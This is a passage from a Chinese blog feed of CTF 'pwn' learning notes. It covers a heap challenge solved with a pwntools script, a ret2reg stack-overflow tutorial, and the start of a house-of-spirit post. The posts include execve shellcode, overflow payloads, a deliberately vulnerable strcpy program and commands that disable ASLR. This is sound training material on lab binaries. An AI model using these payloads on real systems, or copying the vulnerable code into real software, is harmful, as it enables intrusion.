class=\"built_in\">puts</span>;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t这一条把堆块数据区开头8字节赋值了puts函数的地址</p>\n<p>​\t\t然后从第8字节开始读入剩下的数据</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v7 = read(<span class=\"number\">0</span>, (<span class=\"type\">void</span> *)(*((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4) + <span class=\"number\">8LL</span>), size - <span class=\"number\">8</span>);</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t下面这两句刚开始没看懂,一直在想怎么样才能满足这个条件呢,这条语句的意思是,判断输入的数据后面第6字节是否等于8995, 14可以拆成两个来看 8 + 6, 8代表了puts的8字节, 6就是剩下的6字节, 然后判断这个地址的值是否等于8995,<font color=\"red\">8995这样的数还是切换成16进制比较好! 因为在gdb中显示的基本都是16进制,这可能也是自己没判断出来相关关系的一个原因</font></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v1 = *(_WORD *)(v7 + <span class=\"number\">14LL</span> + *((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4));</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( v1 == <span class=\"number\">8995</span> )       v1 == <span class=\"number\">0x2323</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t其实看不太懂没关系,完全可以在gdb中调试的时候发现端倪,在那两次奇怪的xor之后,能够看到符合条件的两个值,0x2323和0x3232</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/image-20230728215445598.png\" alt=\"image-20230728215445598\"></p>\n<p>​\t\t也就是说可以调整位置让程序符合这个判断条件,符合判断条件有什么用呢?</p>\n<p>​\t\t如果不符合条件,v8仍然是后门函数的地址,那么xor后,仍然是一个无效地址,<font color=\"red\">但如果已经xor过一次,通过进入0x2323的执行流,把v8的值设置为xor过一次的地址,那么再次xor后,就恢复原样了!就得到后门函数了</font></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> v8 = magicffff;       </span><br><span class=\"line\"><span class=\"keyword\">if</span> ( v1 == <span class=\"number\">0x2323</span> )</span><br><span class=\"line\">          v8 = *(<span class=\"type\">unsigned</span> __int64 (**)())(v7 + <span class=\"number\">8LL</span> + *((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4));</span><br><span class=\"line\"><span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">7</span>; ++i )</span><br><span class=\"line\">          *(_BYTE *)(v7 + (__int64)i + <span class=\"number\">8</span> + *((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4)) = ((__int64)v8 &gt;&gt; (<span class=\"number\">8</span> * (<span class=\"type\">unsigned</span> __int8)i)) ^ <span class=\"number\">0x23</span>;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"具体步骤\"><a href=\"#具体步骤\" class=\"headerlink\" title=\"具体步骤\"></a>具体步骤</h1><ol>\n<li>刚开始两次add, 都添加大小为32的块，</li>\n</ol>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/image-20230727120328851.png\" alt=\"image-20230727120328851\"></p>\n<ol start=\"2\">\n<li>删除0号块</li>\n</ol>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/image-20230727120539022.png\" alt=\"image-20230727120539022\"></p>\n<ol start=\"3\">\n<li>申请40大小的块（32行吗？32不行，32的话，用不了下一个chunk的prev_size字段），输入31个a（不是32是因为后面会补一个0x00），然后后面两个8字节就被xor了，后面两个8字节，一个是size，一个是存放puts函数地址的，这样的话，就把magic xor后的数值存放到了这里， 所以后面的问题是如何解xor，当时也卡在了这里</li>\n</ol>\n<p>其实在调试中仔细观察的话（所以不能光空想！） 会发现有0x2323 0x3232，正好可以进入到两个判断条件中，  </p>\n<p>后面再进入0x23， 两次xor就回到原先的值了！</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/image-20230727120606798.png\" alt=\"image-20230727120606798\"></p>\n<ol start=\"4\">\n<li>再次释放0</li>\n</ol>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/image-20230727170913465.png\" alt=\"image-20230727170913465\"></p>\n<ol start=\"5\">\n<li>再次申请0 40,并填满</li>\n</ol>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/image-20230727170922279.png\" alt=\"image-20230727170922279\"></p>\n<ol start=\"6\">\n<li>show 1 就可以了</li>\n</ol>\n<p>奥。。。明白为什么比赛的时候做题没做出来了。。没有看懂关键逻辑（以及想当然的以为xor后的东西看着一连串一样的，以为没啥用，其实地址0x55555当然很多一样的了。。）。。就像之前的那道题一样，都不需要写脚本，看懂逻辑了直接交互就可以了</p>\n<p>关键逻辑在add里面</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/image-20230728220659543.png\" alt=\"image-20230728220659543\"></p>\n<h2 id=\"偷一下exp\"><a href=\"#偷一下exp\" class=\"headerlink\" title=\"偷一下exp\"></a>偷一下exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> * </span><br><span class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\">elfPath = <span class=\"string\">&#x27;./pwn&#x27;</span></span><br><span class=\"line\">libcPath = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">remoteAddr = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">remotePort = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.binary = elfPath</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">myelf = context.binary</span><br><span class=\"line\"><span class=\"keyword\">if</span> sys.argv[<span class=\"number\">1</span>] == <span class=\"string\">&#x27;l&#x27;</span>:</span><br><span class=\"line\">    sh = process(elfPath)</span><br><span class=\"line\">    libc = myelf.libc</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> sys.argv[<span class=\"number\">1</span>] == <span class=\"string\">&#x27;d&#x27;</span>:</span><br><span class=\"line\">       sh = process(elfPath, env = &#123;<span class=\"string\">&#x27;LD_PRELOAD&#x27;</span>: libcPath&#125;)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">       sh = remote(remoteAddr,remotePort)</span><br><span class=\"line\">       context.log_level = <span class=\"string\">&#x27;info&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> libcPath:</span><br><span class=\"line\">       libc = ELF(libcPath)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        libc = myelf.libc</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">sz, content</span>):</span><br><span class=\"line\">    sh.sendlineafter(<span class=\"string\">&#x27;option:\\n&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    sh.sendlineafter(<span class=\"string\">&#x27;size:\\n&#x27;</span>, <span class=\"built_in\">str</span>(sz))</span><br><span class=\"line\">    sh.sendlineafter(<span class=\"string\">&#x27;content:\\n&#x27;</span>, content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    sh.sendlineafter(<span class=\"string\">&#x27;option:\\n&#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    sh.sendlineafter(<span class=\"string\">&#x27;id:\\n&#x27;</span>, <span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    sh.sendlineafter(<span class=\"string\">&#x27;option:\\n&#x27;</span>, <span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    sh.sendlineafter(<span class=\"string\">&#x27;id:\\n&#x27;</span>, <span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;a&#x27;</span> ) <span class=\"comment\"># 0</span></span><br><span class=\"line\">    add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;b&#x27;</span> ) <span class=\"comment\"># 1</span></span><br><span class=\"line\">    delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">    gdb.attach(sh)</span><br><span class=\"line\">    add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;c&#x27;</span> * <span class=\"number\">0x1f</span>)</span><br><span class=\"line\">    delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">    add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;d&#x27;</span> * <span class=\"number\">0x1f</span>)</span><br><span class=\"line\">    show(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    sh.interactive()</span><br><span class=\"line\">    sh.close()</span><br></pre></td></tr></table></figure>\n\n\n\n<p><a href=\"https://www.aucyberclub.org/makaleler/2023/01/31/prototypepollution.html\">https://www.aucyberclub.org/makaleler/2023/01/31/prototypepollution.html</a></p>\n<p><a href=\"https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse-2023/calibrator/\">https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse-2023/calibrator/</a></p>\n<p>很多题都不错,好好搞一下有空</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-34-rop%E4%B9%8Bret2reg/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-34-rop%E4%B9%8Bret2reg/",
            "title": "pwn入门-34-rop之ret2reg",
            "date_published": "2023-07-14T14:06:44.000Z",
            "content_html": "<h1 id=\"手法概述\"><a href=\"#手法概述\" class=\"headerlink\" title=\"手法概述\"></a>手法概述</h1><p>​\t\t这一种攻击手法主要利用的是像如 jmp rsp, jmp rax,call rax这种跳转的指令. 这种指令在一些情况下可以对抗ALSR随机化, 因为比如我们写入一段shellcode,但是不知道shellcode的开始地址,不过,如果有一个寄存器,例如rax,指向shellcode的空间,那么栈溢出后,覆盖返回地址为call rax即可返回到shellcode处进行执行.</p>\n<p>​\t\t主要参考的这一篇文章,利用的这里面的例子,不过在复现的时候,有些地方和文章里有点小区别</p>\n<p>​\t\t<a href=\"https://blog.csdn.net/sinat_35695255/article/details/52031813\">https://blog.csdn.net/sinat_35695255/article/details/52031813</a></p>\n<h1 id=\"漏洞代码\"><a href=\"#漏洞代码\" class=\"headerlink\" title=\"漏洞代码\"></a>漏洞代码</h1><p>ret2reg.c  编译:gcc -Wall -g -o ret2reg ret2reg.c -z execstack -m32 -fno-stack-protector</p>\n<p>打开ALSR echo 2 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span>    </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span>    </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">evilfunction</span><span class=\"params\">(<span class=\"type\">char</span> *input)</span> &#123;    </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">char</span> buffer[<span class=\"number\">512</span>];    </span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(buffer, input);    </span><br><span class=\"line\">&#125;    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span> &#123;    </span><br><span class=\"line\"></span><br><span class=\"line\">    evilfunction(argv[<span class=\"number\">1</span>]);    </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;    </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"攻击过程\"><a href=\"#攻击过程\" class=\"headerlink\" title=\"攻击过程\"></a>攻击过程</h1><h2 id=\"寻找溢出长度\"><a href=\"#寻找溢出长度\" class=\"headerlink\" title=\"寻找溢出长度\"></a>寻找溢出长度</h2><p>​\t\t可以通过gdb调试,也可以通过参考文章作者给的办法</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./ret2reg $(perl -e <span class=\"string\">&#x27;printf &quot;A&quot;x524 . &quot;BBBB&quot;&#x27;</span>)  </span><br></pre></td></tr></table></figure>\n\n<p>完之后再查看内核崩溃文件,能看到覆盖了返回地址,EIP被设置为BBBB</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-34-rop%E4%B9%8Bret2reg/image-20230714220708831.png\" alt=\"image-20230714220708831\"></p>\n<h2 id=\"寻找gadget\"><a href=\"#寻找gadget\" class=\"headerlink\" title=\"寻找gadget\"></a>寻找gadget</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@vultr:~/ret2reg# objdump  -d ret2reg | grep *%eax</span><br><span class=\"line\">    101d:\tff d0                \tcall   *%eax</span><br><span class=\"line\">    110c:\tff d0                \tcall   *%eax</span><br><span class=\"line\">    </span><br><span class=\"line\">root@vultr:~/ret2reg# ROPgadget --binary ret2reg --only=&quot;call&quot;</span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x000010b6 : call dword ptr [eax + 0x51]</span><br><span class=\"line\">0x000010af : call dword ptr [eax - 0x73]</span><br><span class=\"line\">0x000011f0 : call dword ptr [edx - 0x77]</span><br><span class=\"line\">0x0000101d : call eax</span><br><span class=\"line\">0x0000115d : call edx</span><br><span class=\"line\"></span><br><span class=\"line\">Unique gadgets found: 5</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"寻找shellcode和寄存器的关系\"><a href=\"#寻找shellcode和寄存器的关系\" class=\"headerlink\" title=\"寻找shellcode和寄存器的关系\"></a>寻找shellcode和寄存器的关系</h2><p>​\t\t在strcpy后,shellcode的存放地址,也在了eax中(存放返回值),因为strcpy函数的返回值是指向最终的目标字符串 dest 的指针，所以如果有jmp eax或者call eax，就可以转移控制流过去</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-34-rop%E4%B9%8Bret2reg/image-20230714230359708.png\" alt=\"image-20230714230359708\"></p>\n<h2 id=\"core文件\"><a href=\"#core文件\" class=\"headerlink\" title=\"core文件\"></a>core文件</h2><p>gdb ret2reg core文件 –q 查看内核崩溃文件, 可以看到崩溃时的情况</p>\n<p>那么,linux 程序崩溃 如何产生core呢?</p>\n<p>ulimit查看,如果为0,就不会产生,需要设置一下,</p>\n<p>ulimit -c unlimited 设置为可以产生coredump且大小不受限制,但仅对当前会话?生效,如果想要永久生效,修改&#x2F;etc&#x2F;profile,加入ulimit -c unlimited即可</p>\n<p>参考链接: <a href=\"https://www.tinymind.net.cn/articles/e4c54a679a8b15\">https://www.tinymind.net.cn/articles/e4c54a679a8b15</a></p>\n<p>设置core文件路径:</p>\n<p>proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern 可以设置格式化的 core 文件保存位置或文件名 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;/core/core-%e-%p-%t&quot; &gt; /proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://www.ngui.cc/el/1819464.html?action=onClick\">https://www.ngui.cc/el/1819464.html?action=onClick</a></p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><p>​\t\t这里的一个重点是要找call eax的地址,</p>\n<p>​\t\techo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space（作者echo 2, 说是不随机化加载地址,但是我这边随机化了…回头再了解下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; vmmap</span><br><span class=\"line\">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class=\"line\">     Start        End Perm     Size Offset File</span><br><span class=\"line\"><span class=\"number\">0x56555000</span> <span class=\"number\">0x56558000</span> r-xp     <span class=\"number\">3000</span>      <span class=\"number\">0</span> /root/ret2reg/ret2reg</span><br><span class=\"line\"><span class=\"number\">0x56558000</span> <span class=\"number\">0x56559000</span> r-xp     <span class=\"number\">1000</span>   <span class=\"number\">2000</span> /root/ret2reg/ret2reg</span><br><span class=\"line\"><span class=\"number\">0x56559000</span> <span class=\"number\">0x5655a000</span> rwxp     <span class=\"number\">1000</span>   <span class=\"number\">3000</span> /root/ret2reg/ret2reg</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"方法一\"><a href=\"#方法一\" class=\"headerlink\" title=\"方法一\"></a>方法一</h3><p>​\t0x5655601d</p>\n<figure class=\"highlight perl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./ret2reg $(perl -e <span class=\"string\">&#x27;printf &quot;\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\x31\\xc0\\xb0\\x0b\\xcd\\x80&quot; . &quot;A&quot;x499 .&quot;\\x1d\\x60\\x55\\x56&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t随机化程度有多少呢? 是否可以枚举\t</p>\n<p>​\t\t根据实际情况测试,随机化的大小好像不是很大,可以直接枚举(回头确认下范围)</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-34-rop%E4%B9%8Bret2reg/image-20230714220717124.png\" alt=\"image-20230714220717124\"></p>\n<p>​\t\t\t和博客里的那个随机化不一样,博客里说把randomize_va_space设置为2,这里设置为2仍然会随机化,设置为0就都取消了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@vultr:~/ret2reg<span class=\"meta\"># echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></span><br><span class=\"line\">root@vultr:~/ret2reg# ./ret2reg $(perl -e <span class=\"string\">&#x27;printf &quot;\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\x31\\xc0\\xb0\\x0b\\xcd\\x80&quot; . &quot;A&quot;x499 .&quot;\\x1d\\x60\\x55\\x56&quot;&#x27;</span>)</span><br><span class=\"line\"><span class=\"meta\"># ls</span></span><br><span class=\"line\">core  <span class=\"built_in\">exp</span>.py  ret2reg  ret2reg.c</span><br><span class=\"line\"><span class=\"meta\"># exit</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h3><p>​\t\t这里面的三个payload都可以用,本质上没啥区别. 不加架构也能成功,<font color=\"red\">注意需要在启动时就传递参数的话,用这种方式 p &#x3D; process(argv&#x3D;[“.&#x2F;ret2reg”,payload])</font></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.arch= &#x27;i386&#x27;</span></span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;i386&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">shellcode = asm(shellcraft.sh())</span><br><span class=\"line\"><span class=\"comment\">#payload = shellcode + b&quot;a&quot;*(524-len(shellcode))+p32(0x5655601d)</span></span><br><span class=\"line\"><span class=\"comment\">#payload = b&quot;\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\x31\\xc0\\xb0\\x0b\\xcd\\x80&quot;+b&quot;a&quot;*499+p32(0x5655601d)</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\x31\\xc0\\xb0\\x0b\\xcd\\x80&quot;</span>+<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">499</span>+<span class=\"string\">b&quot;\\x1d\\x60\\x55\\x56&quot;</span></span><br><span class=\"line\">p = process(argv=[<span class=\"string\">&quot;./ret2reg&quot;</span>,payload])</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<p>参考链接:<a href=\"https://it.cha138.com/jingpin/show-199849.html\">https://it.cha138.com/jingpin/show-199849.html</a></p>\n<h1 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h1><p>jmp可以吗? jmp是指什么来.. </p>\n<p>call和jmp的区别</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-34-rop%E4%B9%8Bret2reg/image-20230718213610314.png\" alt=\"image-20230718213610314\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-34-rop%E4%B9%8Bret2reg/image-20230718213617649.png\" alt=\"image-20230718213617649\"></p>\n<p>2.关于随机化地址的问题</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/",
            "title": "pwn入门-33-houseofspirit",
            "date_published": "2023-06-08T12:51:23.000Z",
            "content_html": "<p>​\t\t这个东西蛮有意思,可以对内存中一块fastbin大小的不可控内存区域进行读写,但它需要满足两个条件</p>\n<p>​\t\t1.该区域的前后的内存是可控的</p>\n<p>​\t\t2.存在一个可控指针可以作为free函数的参数</p>\n<h2 id=\"how2heap的例子\"><a href=\"#how2heap的例子\" class=\"headerlink\" title=\"how2heap的例子\"></a>how2heap的例子</h2><p><a href=\"https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_spirit.c\">https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_spirit.c</a></p>\n<p>确实需要画图,画图的话看得很清晰了就</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/image-20230608205143594.png\" alt=\"image-20230608205143594\"></p>\n<h2 id=\"LCTF-2016-pwn200\"><a href=\"#LCTF-2016-pwn200\" class=\"headerlink\" title=\"LCTF 2016 pwn200\"></a>LCTF 2016 pwn200</h2><p>​\t\t看一下有rwx段,可以写shellcode,本来是想打onegadget的,不过这种打法还需要泄露libc的地址</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/heap/houseofsp<span class=\"meta\"># checksec pwn200</span></span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/ubuntu/heap/houseofsp/pwn200&#x27;</span></span><br><span class=\"line\">    Arch:     amd64<span class=\"number\">-64</span>-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX disabled</span><br><span class=\"line\">    PIE:      No <span class=\"title function_\">PIE</span> <span class=\"params\">(<span class=\"number\">0x400000</span>)</span></span><br><span class=\"line\">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 <span class=\"title function_\">sub_400A8E</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 i; <span 